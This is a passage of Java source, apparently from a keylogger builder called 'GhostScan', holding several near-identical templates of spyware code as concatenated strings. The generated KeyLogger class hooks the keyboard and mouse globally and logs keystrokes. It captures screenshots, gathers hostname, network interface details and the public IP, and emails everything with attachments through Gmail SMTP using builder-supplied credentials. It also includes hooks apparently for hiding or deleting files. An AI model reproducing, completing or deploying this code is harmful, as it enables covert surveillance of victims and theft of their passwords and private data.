								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e) {"
														
											+"e.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
+init    
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile						    
+ocult						
								


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoRed = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
+init
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile						    
+ocult								
									


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoSrcIpRed = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e1) {"
														
											+"e1.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"		
									
+init    
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile							    
+ocult						
				


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
						String codigoRegSrcRed = "package key;"
								+ "import java.awt.AWTException;"
								+ "import java.awt.Dimension;"
								+"import java.awt.Point;"
								+"import java.awt.Rectangle;"
								+"import net.jimmc.jshortcut.JShellLink;"
								+"import java.io.BufferedReader;"
								+"import java.io.BufferedWriter;"
								+"import java.io.File;"
								+"import java.io.FileWriter;"
								+"import java.awt.Robot;"
								+"import java.awt.Toolkit;"
								+"import java.awt.image.BufferedImage;"
								+"import java.io.BufferedReader;"
								+"import java.io.File;"
								+"import java.io.IOException;"
								+"import java.io.InputStreamReader;"
								+"import java.net.Inet4Address;"
								+"import java.net.InetAddress;"
								+"import java.net.InterfaceAddress;"
								+"import java.net.NetworkInterface;"
								+"import java.net.SocketException;"
								+"import java.net.URL;"
								+"import java.net.UnknownHostException;"
								+"import java.util.ArrayList;"
								+"import java.util.Enumeration;"
								+"import java.util.List;"
								+"import javax.imageio.ImageIO;"
								+"import org.apache.commons.mail.DefaultAuthenticator;"
								+"import org.apache.commons.mail.EmailAttachment;"
								+"import org.apache.commons.mail.EmailException;"
								+"import org.apache.commons.mail.HtmlEmail;"
								+"import org.jnativehook.GlobalScreen;"
								+"import org.jnativehook.NativeHookException;"
								+"import org.jnativehook.keyboard.NativeKeyEvent;"
								+"import org.jnativehook.keyboard.NativeKeyListener;"
								+"import org.jnativehook.mouse.NativeMouseEvent;"
								+"import org.jnativehook.mouse.NativeMouseInputListener;"
								+"import java.util.Date;"
								+"import java.text.DateFormat;"
								+"import java.text.SimpleDateFormat;"
								+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
